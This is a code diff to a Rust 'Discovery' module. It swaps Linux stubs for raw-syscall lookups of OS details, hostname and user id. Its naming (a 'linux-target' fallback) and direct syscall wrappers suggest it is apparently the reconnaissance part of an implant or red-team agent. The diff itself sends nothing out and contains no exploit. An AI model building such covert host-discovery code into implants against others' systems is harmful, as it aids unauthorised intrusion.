@@ -47,7 +47,19 @@ impl Discovery {
         }
         #[cfg(not(target_os = "windows"))]
         {
-            String::from("Linux System Info (Stub)")
+            unsafe {
+                let mut uts: crate::utils::syscalls::Utsname = core::mem::zeroed();
+                if crate::utils::syscalls::sys_uname(&mut uts) == 0 {
+                    format!("OS: {}\nNode: {}\nRelease: {}\nMachine: {}",
+                        c_str_to_str(&uts.sysname),
+                        c_str_to_str(&uts.nodename),
+                        c_str_to_str(&uts.release),
+                        c_str_to_str(&uts.machine)
+                    )
+                } else {
+                    String::from("Linux System Info (Failed)")
+                }
+            }
         }
     }
 
@@ -73,6 +85,12 @@ impl Discovery {
         }
         #[cfg(not(target_os = "windows"))]
         {
+            unsafe {
+                let mut uts: crate::utils::syscalls::Utsname = core::mem::zeroed();
+                if crate::utils::syscalls::sys_uname(&mut uts) == 0 {
+                    return String::from(c_str_to_str(&uts.nodename));
+                }
+            }
             String::from("linux-target")
         }
     }
@@ -102,7 +120,20 @@ impl Discovery {
         }
         #[cfg(not(target_os = "windows"))]
         {
-            String::from("root")
+            unsafe {
+                let uid = crate::utils::syscalls::sys_getuid();
+                if uid == 0 {
+                    String::from("root")
+                } else {
+                    format!("user-{}", uid)
+                }
+            }
         }
     }
+}
+
+#[cfg(not(target_os = "windows"))]
+fn c_str_to_str(buf: &[u8]) -> &str {
+    let len = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
+    core::str::from_utf8(&buf[..len]).unwrap_or("unknown")
 }
